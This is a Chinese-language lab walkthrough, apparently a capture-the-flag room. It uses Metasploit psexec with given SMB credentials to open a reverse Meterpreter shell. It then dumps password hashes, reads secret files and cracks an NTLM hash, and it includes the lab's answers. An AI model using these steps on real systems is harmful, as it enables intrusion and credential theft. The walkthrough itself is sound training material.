### 第一阶段：侦查与攻击准备（攻击机操作）

> **目标**：拿到目标机器的 Meterpreter 控制权。

1. **启动 Metasploit 框架**  
    在 Kali 终端输入：

```bash
sudo msfconsole
```
（等待看到 `msf6 >` 提示符出现）_

2. **选择 PSExec 攻击模块**  
    这个模块可以利用已知的 Windows 账号密码，通过 SMB 服务直接在目标系统上执行命令，从而获取 Shell。

```bash
use exploit/windows/smb/psexec
```
（提示符变为 `msf6 exploit(windows/smb/psexec) >`）_

3. **配置目标靶机信息（根据题目提供）**

```bash
set RHOSTS 10.49.178.3   # 设置目标 IP
set SMBUser ballen       # 设置 SMB 用户名
set SMBPass Password1    # 设置 SMB 密码
set LHOST 192.168.163.169 # 设置攻击机监听 IP（您的 Kali IP）
set payload windows/x64/meterpreter/reverse_tcp  # 设置 Meterpreter Payload
```

（注意：`LHOST` 请使用您本地 Kali 的 `eth0` 或 `tun0` 网卡 IP，确保与目标网络通畅）_

4. **设置攻击目标类型并执行**  
	将目标设置为 `0` (自动模式)，让 Metasploit 自动适配系统。

```bash
set target 0
run
```
（看到 `[*] Meterpreter session 1 opened...` 即表示成功！光标变为 `meterpreter >`）_

---

### 第二阶段：后渗透信息收集（Meterpreter 操作）

> **目标**：在目标系统内收集计算机名、域名、用户哈希及隐藏文件。

5. **查看目标系统基本信息**

```bash
sysinfo
```

实战解析：`sysinfo` 是拿 shell 后必做的第一步，能迅速让您掌握目标的操作系统版本、架构和计算机名。

 **提取信息**：计算机名为 `ACME-TEST`，域名为 `FLASH`。

6. **获取原生命令行并查看共享文件夹**

```bash
shell
```

（进入目标系统的 CMD 环境，光标变为 `C:\Windows\system32>`）_

```bash
net share
```

实战解析：检查 SMB 共享是提权后的常规操作，这里找到自定义共享名 `speedster`。
**按 `Ctrl + Z`** 将 CMD 挂起并返回 Meterpreter。

7. **导出所有用户的密码哈希**

```bash
hashdump
```

实战解析：`hashdump` 读取 Windows 系统的 SAM 数据库，是拿到 SYSTEM 权限后的核心操作。_

**提取信息**：找到 `jchambers` 的行，提取 NTLM 哈希：
```text
jchambers:1114:aad3b435b51404eeaad3b435b51404ee:69596c7aa1e8daee17f8e78870e25a5c:::
```

**NTLM 哈希**：`69596c7aa1e8daee17f8e78870e25a5c`

8. **全局搜索秘密文件**

```bash
search -f secrets.txt
search -f realsecret.txt
```

实战解析：目标系统的文件分布很广，使用 `search` 命令能快速全盘查找目标文件。_
**路径 1**：`c:\Program Files (x86)\Windows Multimedia Platform\secrets.txt`
**路径 2**：`c:\inetpub\wwwroot\realsecret.txt`

9. **读取并获取文件内容**


```bash
cat "c:\Program Files (x86)\Windows Multimedia Platform\secrets.txt"
cat "c:\inetpub\wwwroot\realsecret.txt"
```

重要提醒：路径中包含空格时，必须用英文双引号包裹，否则 Meterpreter 会误判为路径结束。_

**内容 1**：`My Twitter password is KDSvbsw3849!`

**内容 2**：`The Flash is the fastest man alive`

10. **破解 jchambers 的明文密码**  
    _实战解析：获得 NTLM 哈希后，本地可使用 `hashcat` 或在线破解网站（如 `crackstation.net`）将哈希转为明文。_
    - **明文密码**：`trustno1`